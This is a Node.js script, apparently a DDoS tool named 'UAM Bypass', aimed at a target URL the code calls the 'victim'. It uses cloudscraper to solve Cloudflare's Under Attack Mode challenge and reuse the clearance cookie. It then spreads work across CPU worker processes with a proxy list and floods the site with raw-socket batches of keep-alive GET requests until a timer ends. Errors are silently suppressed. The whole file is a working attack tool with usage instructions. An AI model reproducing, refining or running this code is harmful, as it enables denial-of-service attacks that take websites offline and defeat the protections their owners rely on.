// Coded by Mezy - https://mezy.cc/ | Started coding it on 24/07/2019 at 6:13am | Finished coding it on 26/07/2019 at 03:14am
// Requirements: npm i events; npm i request; npm i os; npm i fs; npm i cluster; npm i cloudscraper; npm i url; npm i path; npm i net; npm i chalk; npm i colors
const EventEmitter = require('events');
const emitter = new EventEmitter();
emitter.setMaxListeners(Number.POSITIVE_INFINITY);

const {
    fork
} = require('child_process');
const fs = require('fs');
const cluster = require('cluster');
const chalk = require('chalk');
var colors = require('colors');
var path = require('path');
var filename = path.basename(__filename);

process.title = "UAM Bypass - Created by Mezy";

if (cluster.isMaster) {
    let cpuCount = require('os').cpus().length;

    let proxy = fs.readFileSync('proxy.txt', 'utf-8').replace(/\r/g, '').split('\n');
    let proxyCount = proxy.length;

    for (let i = 0; i < cpuCount; i += 1) {
        let worker = cluster.fork();
        worker.send({
            id: worker.id,
            proxy: proxy.splice(0, proxyCount / cpuCount)
        });
    }

    cluster.on('exit', function(worker) {
        console.log('Thread %d died ', worker.id);
        cluster.fork();
    });
} else {

    let workerId = null;
    let proxy = [];
    const attack = require('./bypasser');
    class Start {

        constructor() {
            this.stats = {
                errors: 0,
                success: 0,
                loop: 0
            };
            this.checkInterval = setInterval(() => {
            // this spams so fucking hard - enable it if you want >> [not reccomended]
           //console.log(`Thread: ${workerId} | errors(${this.stats.errors})  | success(${this.stats.success})`);
            }, 1000);
            this.isRunning = false;

            this.attack = new attack(ua, stats => {
                this.stats.errors += stats.errors;
                this.stats.success += stats.success;
            });
        }

        run(props) {
            this.isRunning = true;

            if (props.method === 'attack')
                for (let i = 0; i < props.threads; i++)
                    this.attack.start(props);
        }

        stop() {
            this.attack.stop();
            clearInterval(this.checkInterval);
        }

    }
    //console.log('UAM Bypass - Created by Mezy'.rainbow.bold);
    if (process.argv.length <= 2) {
    console.log('Usage: node '.green.bold + filename.red.bold + ' http://example.com time'.green.bold);
    process.exit(-1);
	} else {
	console.log('Loading proxy list.'.magenta.bold);
	}
    const start = new Start();

    process.on('message', data => {
        workerId = data.id;
        proxy = data.proxy;
        const victim = {
            site: process.argv[2],
            port: process.argv[3]
        };
        proxy.forEach(async p => {
            let _proxy = p.split(':');
            start.run({
                victim: victim,
                proxy: {
                    host: _proxy[0],
                    time: _proxy[1]
                },
                method: 'attack',
                threads: 8,
                requests: 20
            });
        });
    });
}
let cpuCount = require('os').cpus().length;
var cloudscraper = require('cloudscraper');
const url = require('url');
console.log('Starting script: '.green.bold + filename.red.bold);
const sleep = (waitTimeInMs) => new Promise(resolve => setTimeout(resolve, waitTimeInMs));
sleep(1000).then(() => {
console.log('Sent cookie request; waiting on response'.yellow.bold);
});
if (process.argv.length <= 2) {
    //console.log("Usage: node " + filename + " <url> <time>");
    //console.log("Usage: node " + filename + " <http://example.com> <60>");
    process.exit(-1);
}
/* we will use these later, not needed rn.
const userAgents = fs.readFileSync('useragents.txt', 'utf-8').replace(/\r/g, '').split('\n');
	const userAgents = [
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3599.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.18247",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3599.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3599.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3599.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3599.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3599.0 Safari/537.36",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
	"Googlebot/2.1 (+http://www.googlebot.com/bot.html)",
	"Googlebot/2.1 (+http://www.google.com/bot.html)",
    "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
]*/

var site = process.argv[2];
var time = process.argv[3];
var cookie = "";
var ua = "";
var host = url.parse(site).host;
cloudscraper.get(site, function(error, response) {
    if (error) {} else {
        var parsed = JSON.parse(JSON.stringify(response));
        cookie = (parsed["request"]["headers"]["cookie"]);
        if (cookie == undefined) {
            cookie = (parsed["headers"]["set-cookie"]);
        }
        ua = (parsed["request"]["headers"]["User-Agent"]);
    }
    if (cookie) {
    console.log('\nSuccessfully recieved cookie'.green.bold)
    console.log(cookie.cyan.bold + '\n');
	} else {
	console.log('Unable to obtain cookie from '.red.bold + site.yellow.bold + '\n');
	process.exit(-1);
	//we will use this another time
	/*var string = "Unable to obtain cookie",
	substring = "Unable";
	process.exit(string.indexOf(substring) !== -1)*/
	}
});
var counter = 0;
var site = site.replace('https', 'http');
var int = setInterval(() => {
    if (cookie !== '' && ua !== '') {
        var s = require('net').Socket();
        s.connect(80, host);
        s.setTimeout(10000);
        for (var i = 0; i < 50; i++) {
            s.write('GET ' + site + '/ HTTP/1.1\r\nHost: ' + host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*//*;q=0.8\r\nUser-Agent: ' + ua + '\r\nUpgrade-Insecure-Requests: 1\r\nCookie: ' + cookie + '\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\ncache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
        }
        s.on('data', function() {
            setTimeout(function() {
                s.destroy();
                return delete s;
            }, 5000);
        })
    }
});
setTimeout(() => clearInterval(int), time * 1000);

// to not crash on errors
process.on('uncaughtException', (err) => {});
process.on('unhandledRejection', (err) => {});

/* we don't need these, for the minute - but we'll keep them here just incase we do.
process.on('uncaughtException', function (err) {
	console.log(err);
});

process.on('unhandledRejection', function (err) {
	console.log(err);
});

process.on('uncaughtException', e => {});
process.on('uncaughtRejection', e => {});
process.on('warning', e => {});
*/
